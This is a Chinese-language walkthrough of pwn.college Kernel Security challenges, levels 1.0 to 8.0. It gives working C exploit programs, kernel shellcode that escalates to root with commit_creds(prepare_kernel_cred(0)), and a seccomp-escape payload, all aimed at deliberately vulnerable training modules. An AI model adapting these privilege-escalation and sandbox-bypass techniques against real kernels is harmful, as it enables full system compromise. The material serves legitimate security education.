# Practice-Pwncollege

`pwn.college`提供了linux kernel相关的学习资料和练习。太好了，直接跟着学

## [Kernel Security](https://pwn.college/system-security/kernel-security)

`levelx.1`的解法与`levelx.0`完全相同，此处省略

### level1.0

建议阅读完`Lectures and Reading`的前三项（直到读完`Kernel: Kernel Modules`）再做这题（虽然题目很简单）

`/challenge`下有一个`.ko`文件。`.ko`其实就是elf，直接正常反编译即可

`init_module`函数里有一句`proc_create("pwncollege", 438, 0, &fops)`，说明我们可以从`/proc/pwncollege`与这个模块通信。`device_write`中将输入的内容与硬编码的密码进行比对，结果存入`device_state[0]`。`device_read`中，若`device_state[0]`等于0，则输出flag。好的这是一个逆向题而不是pwn（

直接在终端就能解：
```sh
echo "password" > /proc/pwncollege
cat /proc/pwncollege
```
（怀疑每个环境的密码不同，以下省略具体的密码）

### level2.0

继续是硬编码的密码。flag输出到了内核日志里，可以用`dmesg`查看。不知道为什么，ida似乎反编译失败了，ghidra里是这样：`printk(&DAT_00100658,flag)`；而ida pro里是这样的：`printk(&unk_618)`，完全没有flag的踪影

### level3.0

输入正确的密码可以得到root权限，进而可以直接`cat /flag`得到flag

### level4.0

做之前可以看一下`Kernel: Privilege Escalation`的内容，但也不是很有必要……

仍然是输密码，但需要编写C脚本调用ioctl
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char password[] = "";
    ioctl(fd, 1337, &password);
    system("cat /flag");
    return 0;
}
```
编译：`gcc ./exp.c -o ./exp`

### level5.0

`device_ioctl`会将参数的值当作地址，并执行地址指向的内容。同时模块里存在一个win函数。唯一的问题是我们似乎不知道win函数的具体地址？kernel似乎每次加载都会改动基地址？

运行`dmesg | grep -i kaslr`后可以发现启动kernel时带了`nokaslr`。那没事了。在practice环境里看一眼win函数的地址：`sudo cat /proc/kallsyms | grep win`，然后直接用就好
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    unsigned long addr=0xffffffffc000012d;
    ioctl(fd, 1337, addr);
    system("cat /flag");
    return 0;
}
```

### level6.0

建议阅读`Kernel Security: Writing Kernel Shellcode`后再做这题

在kernel中运行的shellcode没法用syscall，因为调用syscall时系统会认为当前需要切换至内核态，并做一些相应的假设。而这些假设放到kernel里会崩溃。不过还好我们也不需要做太复杂的东西，调用经典的`commit_creds(prepare_kernel_cred(0))`拿到root权限后回到用户态读flag即可

仍然没有kaslr。在`/proc/kallsyms`中找到这两个函数的地址后编写shellcode
```
xor rdi,rdi
mov rax,0xffffffff81089660
call rax
mov rdi,rax
mov rax,0xffffffff81089310
call rax
ret
```
```c
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char shellcode[]="\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
    write(fd,shellcode,sizeof(shellcode));
    system("cat /flag");
    return 0;
}
```
另外，shellcode末尾的ret是必须的。内核中运行的shellcode不能出现崩溃的情况，不然整个内核直接炸掉，甚至来不及拿到flag

### level7.0

第一次用上了环境里准备的调试功能。首先`vm start`，然后`sudo vm debug`。召唤出来的gdb是普通版本，所以需要加sudo，从而能够在gdb里运行`source /opt/pwndbg/gdbinit.py`

至于题目的模块，主要就是分清arg各个位置存的是什么：
- 在arg处传入shellcode的长度
- 在arg + 0x1008传入shellcode的地址
- 在arg + 8处传入shellcode的内容

没有kaslr，所以直接用调试器看shellcode的地址
```c
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
int main() {
    int fd = open("/proc/pwncollege", O_RDWR);
    char shellcode[]="\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
    char arg[0x1010] = {0};
    *(unsigned long*)arg = sizeof(shellcode);
    memcpy(arg + 8, shellcode, sizeof(shellcode));
    *(void**)(arg + 0x1008) = (void*)0xffffc90000085000;
    ioctl(fd,1337,arg);
    system("cat /flag");
    return 0;
}
```
### level8.0

建议阅读`Kernel: Escaping Seccomp`后再做这题

由于`proc_create("pwncollege",0600,0,&fops)`中设置的权限是`0600`，我们无法直接与这个模块交互。不过提供了交互用的elf，问题不大

elf中设置了seccomp，只能调用write。write很明显是要我们与模块交互，问题是交互完之后呢？拿到root权限后没有syscall也看不了flag。参考上述的学习资料，shellcode除了提权外，还可以取消当前进程的seccomp。这下思路就很清晰了
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
int main() {
    int pipe1[2];
    int pipe2[2];
    if (pipe(pipe1) == -1 || pipe(pipe2) == -1) {
        perror("pipe");
        exit(EXIT_FAILURE);
    }
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(EXIT_FAILURE);
    }
    if (pid == 0) {
        close(pipe1[1]);
        close(pipe2[0]);
        dup2(pipe1[0], STDIN_FILENO);
        close(pipe1[0]);
        dup2(pipe2[1], STDOUT_FILENO);
        close(pipe2[1]);
        execl("/challenge/babykernel_level8.0", "/challenge/babykernel_level8.0", NULL);
        perror("execl");
        exit(EXIT_FAILURE);
    } else {
        close(pipe1[0]);
        close(pipe2[1]);
        char shellcode[] = "\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x03\x00\x00\x00\x48\xC7\xC6\x67\x70\x33\x31\x48\xC7\xC2\x3A\x00\x00\x00\x0F\x05\x48\xB8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xB8\x2E\x67\x6D\x60\x66\x01\x01\x01\x48\x31\x04\x24\x48\x89\xE7\x31\xD2\x31\xF6\x6A\x02\x58\x0F\x05\x31\xC0\x6A\x04\x5F\x6A\x40\x5A\x48\xC7\xC6\x00\x74\x33\x31\x0F\x05\x6A\x01\x5F\x6A\x40\x5A\x48\xC7\xC6\x00\x74\x33\x31\x6A\x01\x58\x0F\x05\xC3\x65\x48\x8B\x1C\x25\x00\x5D\x01\x00\x48\x8B\x33\x48\x81\x23\xFF\xFE\xFF\xFF\x48\x31\xFF\x48\xC7\xC0\x60\x96\x08\x81\xFF\xD0\x48\x89\xC7\x48\xC7\xC0\x10\x93\x08\x81\xFF\xD0\xC3";
        write(pipe1[1], shellcode, sizeof(shellcode));
        close(pipe1[1]);
        char buffer[1024];
        ssize_t bytes_read;
        while ((bytes_read = read(pipe2[0], buffer, sizeof(buffer)))) {
            if (bytes_read == -1) {
                perror("read");
                break;
            }
            write(STDOUT_FILENO, buffer, bytes_read);
        }
        close(pipe2[0]);
        wait(NULL);
    }
    return 0;
}
```
deepseek给的双向交互模板（popen只能读或者只能写），不知道对不对。至少这题用着没问题。执行的shellcode的汇编如下：
```
mov rax,1
mov rdi,3
mov rsi,0x0000000031337067
mov rdx,58
syscall
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101010101 ^ 0x67616c662f
xor [rsp], rax
mov rdi, rsp
xor edx, edx
xor esi, esi
push 2
pop rax
syscall
xor eax, eax
push 4
pop rdi
push 0x40
pop rdx
mov rsi, 0x31337400
syscall
push 1
pop rdi
push 0x40
pop rdx
mov rsi, 0x31337400
push 1
pop rax
syscall
ret
mov rbx,QWORD PTR gs:0x15d00
mov rsi,QWORD PTR [rbx]
and QWORD PTR [rbx],0xfffffffffffffeff
xor rdi,rdi
mov rax,0xffffffff81089660
call rax
mov rdi,rax
mov rax,0xffffffff81089310
call rax
ret
```
第一个ret指令后是取消seccomp+提权的shellcode。`gs:0x15d00`是我跟着视频抄的。不过今后发现偏移不对的话可以自己写一个模块并用`vm build`编译并安装进虚拟机中（需要再运行一次`vm start`重启），手动查看取消seccomp的代码对应的汇编是什么

用户态只会执行第一段shellcode（到一个ret）。把两段shellcode放一起主要是因为`_copy_from_user`没法跨进程，必须让shellcode出现在当前elf的用户态内存中才能正确拷贝到期望的shellcode（我差点在第一段shellcode中引用exp里的地址……）

mmap的地址是固定的，可以通过计算得到`0x31337067`，即第二段shellcode的起始点

本来想用execve的，但是无论是执行`/bin/sh`还是`/bin/cat /flag`都得不到输出。只能古法orw了